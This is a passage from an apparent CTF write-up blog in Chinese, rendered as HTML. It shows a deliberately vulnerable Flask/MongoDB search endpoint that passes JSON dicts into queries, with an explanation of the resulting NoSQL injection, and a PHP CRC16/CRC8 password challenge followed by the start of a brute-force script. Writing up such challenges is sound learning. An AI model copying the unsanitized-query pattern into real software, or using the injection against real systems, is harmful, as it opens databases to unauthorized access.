+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, books<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>():
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;$and&#34;</span>: []}
+</span></span><span style="display:flex;"><span>    books <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>        title <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;title&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        author <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;author&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        title_clean <span style="color:#f92672">=</span> sanitize(title)
+</span></span><span style="display:flex;"><span>        author_clean <span style="color:#f92672">=</span> sanitize(author)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> title_clean:
+</span></span><span style="display:flex;"><span>            query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;title&#34;</span>: {<span style="color:#e6db74">&#34;$eq&#34;</span>: title_clean}})  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> author_clean:
+</span></span><span style="display:flex;"><span>            query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;author&#34;</span>: {<span style="color:#e6db74">&#34;$eq&#34;</span>: author_clean}}) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> query[<span style="color:#e6db74">&#34;$and&#34;</span>]:
+</span></span><span style="display:flex;"><span>            books <span style="color:#f92672">=</span> list(books_collection<span style="color:#f92672">.</span>find(query))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, books<span style="color:#f92672">=</span>books)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>content_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;application/json&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_json(force<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                title <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;title&#34;</span>)
+</span></span><span style="display:flex;"><span>                author <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;author&#34;</span>)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> isinstance(title, str):
+</span></span><span style="display:flex;"><span>                    title <span style="color:#f92672">=</span> sanitize(title)
+</span></span><span style="display:flex;"><span>                    query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;title&#34;</span>: title})
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span> isinstance(title, dict):
+</span></span><span style="display:flex;"><span>                    query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;title&#34;</span>: title})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> isinstance(author, str):
+</span></span><span style="display:flex;"><span>                    author <span style="color:#f92672">=</span> sanitize(author)
+</span></span><span style="display:flex;"><span>                    query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;author&#34;</span>: author})
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span> isinstance(author, dict):
+</span></span><span style="display:flex;"><span>                    query[<span style="color:#e6db74">&#34;$and&#34;</span>]<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;author&#34;</span>: author})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> query[<span style="color:#e6db74">&#34;$and&#34;</span>]:
+</span></span><span style="display:flex;"><span>                    books <span style="color:#f92672">=</span> list(books_collection<span style="color:#f92672">.</span>find(query))
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> jsonify([
+</span></span><span style="display:flex;"><span>                        {<span style="color:#e6db74">&#34;title&#34;</span>: b<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;title&#34;</span>), <span style="color:#e6db74">&#34;author&#34;</span>: b<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;author&#34;</span>), <span style="color:#e6db74">&#34;description&#34;</span>: b<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;description&#34;</span>)} <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> books
+</span></span><span style="display:flex;"><span>                    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Empty query&#34;</span>}), <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: str(e)}), <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Unsupported Content-Type&#34;</span>}), <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">8000</span>)
+</span></span></code></pre></div><p>flask+mongodb实现了一个BookStore根据title和author查询book的功能，如果是GET方式请求或是POST方式传参string，参数会被sanitize方法过滤，只允许大小写字母数字空格，无法实现NoSQL注入</p>
+<p>但如果是POST方式请求，传参格式为json，就不会进行任何过滤，且NoSQL注入刚好需要传入dict类型数据：</p>
+<p><img alt="alt" loading="lazy" src="/images/NSSCTF4th/1.png"></p>
+<hr>
+<h2 id="ezcrc">EzCRC<a hidden class="anchor" aria-hidden="true" href="#ezcrc">#</a></h2>
+<p>index.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">compute_crc16</span>($data) {
+</span></span><span style="display:flex;"><span>    $checksum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFF</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($data); $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $checksum <span style="color:#f92672">^=</span> <span style="color:#a6e22e">ord</span>($data[$i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; $j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($checksum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                $checksum <span style="color:#f92672">=</span> (($checksum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xA001</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                $checksum <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $checksum;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">calculate_crc8</span>($input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> $crc8_table <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x15</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x2A</span>, <span style="color:#ae81ff">0x2D</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x65</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x5D</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0xFB</span>, <span style="color:#ae81ff">0xF2</span>, <span style="color:#ae81ff">0xF5</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xCD</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x85</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0xAF</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0xB4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0xBD</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0xCE</span>, <span style="color:#ae81ff">0xDB</span>, <span style="color:#ae81ff">0xDC</span>, <span style="color:#ae81ff">0xD5</span>, <span style="color:#ae81ff">0xD2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xF8</span>, <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0xF6</span>, <span style="color:#ae81ff">0xE3</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0xEA</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xB7</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0xB9</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0xAC</span>, <span style="color:#ae81ff">0xA5</span>, <span style="color:#ae81ff">0xA2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x8F</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0x9A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x2E</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x32</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x1F</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x0A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x4B</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x42</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0x7A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x8E</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x9C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xB1</span>, <span style="color:#ae81ff">0xB6</span>, <span style="color:#ae81ff">0xBF</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0xAD</span>, <span style="color:#ae81ff">0xAA</span>, <span style="color:#ae81ff">0xA3</span>, <span style="color:#ae81ff">0xA4</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0xE5</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xEC</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xC8</span>, <span style="color:#ae81ff">0xDD</span>, <span style="color:#ae81ff">0xDA</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xD4</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x7C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x1E</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x0C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x5B</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x63</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x2C</span>, <span style="color:#ae81ff">0x2B</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x1A</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x13</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xAE</span>, <span style="color:#ae81ff">0xA9</span>, <span style="color:#ae81ff">0xA0</span>, <span style="color:#ae81ff">0xA7</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0xB5</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0xBB</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x8A</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x83</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xDE</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0xD7</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xCB</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xFD</span>, <span style="color:#ae81ff">0xF4</span>, <span style="color:#ae81ff">0xF3</span>
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#39;C*&#39;</span>, $input);
+</span></span><span style="display:flex;"><span>    $length <span style="color:#f92672">=</span> <span style="color:#a6e22e">count</span>($bytes);
+</span></span><span style="display:flex;"><span>    $crc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($k <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; $k <span style="color:#f92672">&lt;=</span> $length; $k<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $crc <span style="color:#f92672">=</span> $crc8_table[($crc <span style="color:#f92672">^</span> $bytes[$k]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $crc <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$SECRET_PASS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Enj0yNSSCTF4th!&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>($SECRET_PASS) <span style="color:#f92672">==</span> <span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $correct_pass_crc16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">compute_crc16</span>($SECRET_PASS);
+</span></span><span style="display:flex;"><span>    $correct_pass_crc8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate_crc8</span>($SECRET_PASS);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $user_input <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
+</span></span><span style="display:flex;"><span>    $user_pass_crc16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">compute_crc16</span>($user_input);
+</span></span><span style="display:flex;"><span>    $user_pass_crc8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate_crc8</span>($user_input);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($SECRET_PASS <span style="color:#f92672">===</span> $user_input) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;这样不行&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($correct_pass_crc16 <span style="color:#f92672">!==</span> $user_pass_crc16) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;这样也不行&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($correct_pass_crc8 <span style="color:#f92672">!==</span> $user_pass_crc8) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;这样还是不行吧&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $granted_access <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($granted_access) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;都到这份上了,flag就给你了: </span><span style="color:#e6db74">$FLAG</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;不不不&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;再试试&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>实现了CRC16和CRC8的验证，要求长度和所给$SECRET_PASS一样</p>
+<p>直接爆破，一开始写的python脚本，发现python的len和php的strlen对某些字符的长度判断不同，后来改用php写，只是爆破速度慢一些：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">compute_crc16</span>($data) {
+</span></span><span style="display:flex;"><span>    $checksum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFF</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($data); $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $checksum <span style="color:#f92672">^=</span> <span style="color:#a6e22e">ord</span>($data[$i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; $j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($checksum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                $checksum <span style="color:#f92672">=</span> (($checksum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xA001</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                $checksum <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
